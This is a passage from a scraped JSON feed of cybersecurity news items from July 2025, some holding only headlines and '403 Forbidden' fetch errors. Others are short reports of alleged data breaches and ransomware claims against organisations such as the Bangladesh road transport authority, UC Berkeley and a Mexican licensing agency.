        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.securityweek.com/open-source-cisa-tool-helps-defenders-with-hacker-containment-eviction/"
    },
    {
        "Title": "Who’s Really Behind the Mask? Combatting Identity Fraud",
        "Link": "https://www.securityweek.com/whos-really-behind-the-mask-combatting-identity-fraud/",
        "Summary": "<p>Why context, behavioral baselines, and multi-source visibility are the new pillars of identity security in a world where credentials alone no longer cut it.</p>\n<p>The post <a href=\"https://www.securityweek.com/whos-really-behind-the-mask-combatting-identity-fraud/\">Who’s Really Behind the Mask? Combatting Identity Fraud</a> appeared first on <a href=\"https://www.securityweek.com\">SecurityWeek</a>.</p>",
        "Date": "2025-07-31",
        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.securityweek.com/whos-really-behind-the-mask-combatting-identity-fraud/"
    },
    {
        "Title": "API Security Firm Wallarm Raises $55 Million",
        "Link": "https://www.securityweek.com/api-security-firm-wallarm-raises-55-million/",
        "Summary": "<p>Wallarm has raised money in a Series C funding round led by Toba Capital, which brings the total raised by the company to over $70 million.</p>\n<p>The post <a href=\"https://www.securityweek.com/api-security-firm-wallarm-raises-55-million/\">API Security Firm Wallarm Raises $55 Million</a> appeared first on <a href=\"https://www.securityweek.com\">SecurityWeek</a>.</p>",
        "Date": "2025-07-31",
        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.securityweek.com/api-security-firm-wallarm-raises-55-million/"
    },
    {
        "Title": "Browser Extensions Pose Serious Threat to Gen-AI Tools Handling Sensitive Data",
        "Link": "https://www.securityweek.com/browser-extensions-pose-serious-threat-to-gen-ai-tools-handling-sensitive-data/",
        "Summary": "<p>LayerX has disclosed an AI chatbot hacking method via web browser extensions it has named ‘man-in-the-prompt’.</p>\n<p>The post <a href=\"https://www.securityweek.com/browser-extensions-pose-serious-threat-to-gen-ai-tools-handling-sensitive-data/\">Browser Extensions Pose Serious Threat to Gen-AI Tools Handling Sensitive Data </a> appeared first on <a href=\"https://www.securityweek.com\">SecurityWeek</a>.</p>",
        "Date": "2025-07-31",
        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.securityweek.com/browser-extensions-pose-serious-threat-to-gen-ai-tools-handling-sensitive-data/"
    },
    {
        "Title": "Report Links Chinese Companies to Tools Used by State-Sponsored Hackers",
        "Link": "https://www.securityweek.com/report-links-chinese-companies-to-tools-used-by-state-sponsored-hackers/",
        "Summary": "<p>SentinelLabs connects the dots between prolific Chinese state-sponsored hackers and companies developing intrusion tools.</p>\n<p>The post <a href=\"https://www.securityweek.com/report-links-chinese-companies-to-tools-used-by-state-sponsored-hackers/\">Report Links Chinese Companies to Tools Used by State-Sponsored Hackers</a> appeared first on <a href=\"https://www.securityweek.com\">SecurityWeek</a>.</p>",
        "Date": "2025-07-31",
        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.securityweek.com/report-links-chinese-companies-to-tools-used-by-state-sponsored-hackers/"
    },
    {
        "Title": "Honeywell Experion PKS Flaws Allow Manipulation of Industrial Processes",
        "Link": "https://www.securityweek.com/honeywell-experion-pks-flaws-allow-manipulation-of-industrial-processes/",
        "Summary": "<p>Honeywell has patched several critical and high-severity vulnerabilities in its Experion PKS  industrial process control and automation product.</p>\n<p>The post <a href=\"https://www.securityweek.com/honeywell-experion-pks-flaws-allow-manipulation-of-industrial-processes/\">Honeywell Experion PKS Flaws Allow Manipulation of Industrial Processes</a> appeared first on <a href=\"https://www.securityweek.com\">SecurityWeek</a>.</p>",
        "Date": "2025-07-31",
        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.securityweek.com/honeywell-experion-pks-flaws-allow-manipulation-of-industrial-processes/"
    },
    {
        "Title": "Google Project Zero Tackles Upstream Patch Gap With New Policy",
        "Link": "https://www.securityweek.com/google-project-zero-tackles-upstream-patch-gap-with-new-policy/",
        "Summary": "<p>Google Project Zero now publicly shares the discovery of a vulnerability and when its 90-day disclosure deadline expires.</p>\n<p>The post <a href=\"https://www.securityweek.com/google-project-zero-tackles-upstream-patch-gap-with-new-policy/\">Google Project Zero Tackles Upstream Patch Gap With New Policy</a> appeared first on <a href=\"https://www.securityweek.com\">SecurityWeek</a>.</p>",
        "Date": "2025-07-31",
        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.securityweek.com/google-project-zero-tackles-upstream-patch-gap-with-new-policy/"
    },
    {
        "Title": "Bangladesh Road Transport Authority Data Allegedly Breached – Over 1 Million Records for Sale",
        "Link": "https://dailydarkweb.net/bangladesh-road-transport-authority-data-allegedly-breached-over-1-million-records-for-sale/",
        "Summary": "A threat actor has allegedly put a database containing over one million records from the Bangladesh Road Transport Authority (BRTA) up for sale on a dark web forum. The BRTA is the government body responsible for regulating the road transport sector, issuing driving licenses, and registering vehicles throughout Bangladesh. The agency, which operates under the [&#8230;]",
        "Date": "2025-07-31",
        "Content": "A threat actor has allegedly put a database containing over one million records from the Bangladesh Road Transport Authority (BRTA) up for sale on a dark web forum. The BRTA is the government body responsible for regulating the road transport sector, issuing driving licenses, and registering vehicles throughout Bangladesh. The agency, which operates under the Ministry of Road Transport and Bridges, is fundamental to the nation’s transportation infrastructure, holding sensitive data on millions of citizens and vehicles.\nThe seller posted the database for sale earlier today, claiming it contains 1,008,506 unique records with a breach date of July 31, 2025. The data, priced at $1200, allegedly includes a vast amount of personally identifiable information (PII). A sample of the data was provided in the listing to demonstrate its authenticity. The exposure of such information could lead to widespread identity theft, targeted phishing attacks, and other malicious activities against the individuals whose data has been compromised.\nAccording to the forum post, the compromised database includes the following sensitive details:\nUsername\nNational ID (NID) Number\nDate of Birth\nFather’s Name (in Bangla and English)\nMother’s Name\nPassport Number\nContact Number\nEmail Address\nFull address details including Village, Road, District, Thana, and Post Code\nTags:\nBangladesh\nBRTA\ncyberattack\ndark web\ndata-breach\ngovernment\nPII"
    },
    {
        "Title": "Qilin Ransomware Claims Attacks on Jordan’s ASEZA and Colombia’s PDC",
        "Link": "https://dailydarkweb.net/qilin-ransomware-claims-attacks-on-jordans-aseza-and-colombias-pdc/",
        "Summary": "The Qilin ransomware group has once again surfaced, allegedly adding two significant entities from different sectors to its dark web leak site. The group, known for its double-extortion tactics, claims to have successfully breached a major governmental authority in Jordan and a financial services company in Colombia, threatening to release sensitive data stolen from their [&#8230;]",
        "Date": "2025-07-31",
        "Content": "The Qilin ransomware group has once again surfaced, allegedly adding two significant entities from different sectors to its dark web leak site. The group, known for its double-extortion tactics, claims to have successfully breached a major governmental authority in Jordan and a financial services company in Colombia, threatening to release sensitive data stolen from their networks. This incident highlights the continuous and indiscriminate threat posed by ransomware gangs to organizations worldwide.\nThe threat actors have published files allegedly belonging to the victims to pressure them into paying a ransom. The compromised organizations are:\n🇯🇴\nAqaba Special Economic Zone Authority (ASEZA):\nA leading administrative and governmental institution in the Hashemite Kingdom of Jordan. ASEZA plays a crucial role in the development, management, and regulation of the Aqaba Special Economic Zone, a key driver of investment and economic activity in the country.\n🇨🇴\nPromociones y Cobranzas Beta (PDC):\nA Colombian company established in 1987, operating as a subsidiary of the major bank Davivienda. The firm specializes in debt collection and financial assistance for personal banking portfolios.\nAs proof of their claims, the Qilin group has posted samples of the exfiltrated data. The leaked information allegedly includes highly sensitive documents from both organizations. For ASEZA, the breach appears to have exposed personal identification documents, such as passports, alongside internal corporate papers. The data from PDC allegedly consists of sensitive financial documents and business records. The release of this initial data set is a common tactic used to coerce victims into meeting the attackers’ demands.\nAllegedly Leaked Data:\nPersonal identification documents (Passports)\nInternal corporate and financial documents\nBusiness records and contracts\nTags:\nASEZA\nColombia\ncyberattack\ndata-breach\nFinancial Services\ngovernment\nJordan\nPDC\nQilin\nransomware"
    },
    {
        "Title": "UC Berkeley Targeted in Major Data Breach –  Full University Database Allegedly For Sale Online",
        "Link": "https://dailydarkweb.net/uc-berkeley-targeted-in-major-data-breach-full-university-database-allegedly-for-sale-online/",
        "Summary": "A threat actor is allegedly selling the database of the University of California, Berkeley, a world-renowned public research university and one of the most prestigious academic institutions in the United States. The seller posted an advertisement on a popular cybercrime forum, claiming to have obtained the university&#8217;s complete database and offering it for sale in [&#8230;]",
        "Date": "2025-07-31",
        "Content": "A threat actor is allegedly selling the database of the University of California, Berkeley, a world-renowned public research university and one of the most prestigious academic institutions in the United States. The seller posted an advertisement on a popular cybercrime forum, claiming to have obtained the university’s complete database and offering it for sale in both SQL and CSV formats. The post also claims to provide access to the university’s phpMyAdmin panel, a web-based database administration tool.\nTo substantiate their claims, the threat actor included several screenshots as proof. These images display backend access to the university’s databases, showing tables containing sensitive information and lists of user accounts with usernames, email addresses, and hashed passwords. The actor also noted that several of Berkeley’s subdomains were experiencing outages at the time of the post, an observation supported by other screenshots showing database connection errors on official university websites. This incident poses a significant security risk to the university’s students, faculty, and staff, potentially exposing their personal and financial information.\nThe compromised data allegedly includes a wide range of sensitive information:\nStudent data\nSeminar information\nTeacher details\nUsernames and password hashes\nPayment data made by the university\nTags:\ncyber-attack\nCyberSecurity\ndata-breach\ndatabase leak\nEducation\nhigher education\nUC Berkeley"
    },
    {
        "Title": "Quintana Roo Mobility Institute (IMOVEQROO) Allegedly Breached – Driver’s Licenses Leaked",
        "Link": "https://dailydarkweb.net/quintana-roo-mobility-institute-imoveqroo-allegedly-breached-drivers-licenses-leaked/",
        "Summary": "A major data breach has allegedly hit the Mobility Institute of the State of Quintana Roo (IMOVEQROO), the governmental body in Mexico in charge of transportation services and the issuance of driver&#8217;s licenses. The incident came to light after a post on a dark web forum announced the breach and claimed to have exfiltrated sensitive [&#8230;]",
        "Date": "2025-07-31",
        "Content": "A major data breach has allegedly hit the Mobility Institute of the State of Quintana Roo (IMOVEQROO), the governmental body in Mexico in charge of transportation services and the issuance of driver’s licenses. The incident came to light after a post on a dark web forum announced the breach and claimed to have exfiltrated sensitive personal data belonging to citizens. As the official entity for managing driver documentation, IMOVEQROO holds a significant amount of personal data, making this a critical cybersecurity event.\nThe individual who posted the data on the dark web claims to have obtained a substantial amount of information, and has also published links to download the compromised files. The data allegedly includes not just the digital copies of driver’s licenses, complete with photographs, signatures and personal details, but also information that would allow these licenses to be added to digital wallets. Such a breach could potentially lead to widespread identity theft and other forms of fraud, affecting a large number of people in the Quintana Roo region.\nThe leaked data allegedly includes:\nOfficial driver’s license with photo, signature and personal information\nLink to add the license to Google Wallet\nPersonal data such as photos, business and home addresses\nDriver’s license data\nTags:\nCyberSecurity\ndark web\ndata-breach\ndata-leak\ndriver's license\ngovernment\nIMOVEQROO\nMexico"
    },
    {
        "Title": "Club Grido Loyalty Program Data Allegedly Leaked on Dark Web",
        "Link": "https://dailydarkweb.net/club-grido-loyalty-program-data-allegedly-leaked-on-dark-web/",
        "Summary": "A significant data breach has allegedly struck Club Grido, the customer loyalty program for the popular Argentinian ice cream parlor chain, Grido. A threat actor posted on a dark web forum claiming to have possession of the full database for the loyalty program, releasing it for free. Grido is one of the largest ice cream [&#8230;]",
        "Date": "2025-07-31",
        "Content": "A significant data breach has allegedly struck Club Grido, the customer loyalty program for the popular Argentinian ice cream parlor chain, Grido. A threat actor posted on a dark web forum claiming to have possession of the full database for the loyalty program, releasing it for free. Grido is one of the largest ice cream chains in Latin America, with thousands of franchises across several countries, making this a potentially wide-reaching incident.\nThe leaked data, as detailed in the forum post, allegedly contains a vast amount of sensitive personal information belonging to the members of the loyalty program. The actor claims the dump includes internal records from the Club Grido platform. If confirmed, this breach could expose customers to various risks, including identity theft and targeted phishing attacks.\nThe compromised information allegedly includes:\nFull names\nNational IDs (DNI)\nEmail addresses\nLoyalty card numbers\nBirthdates\nPoints balance\nRegistration dates\nLocation data (cities and provinces)\nGender\nTags:\nArgentina\nClub Grido\nCyberSecurity\ndata-breach\nGrido\nleaked data"
    }
]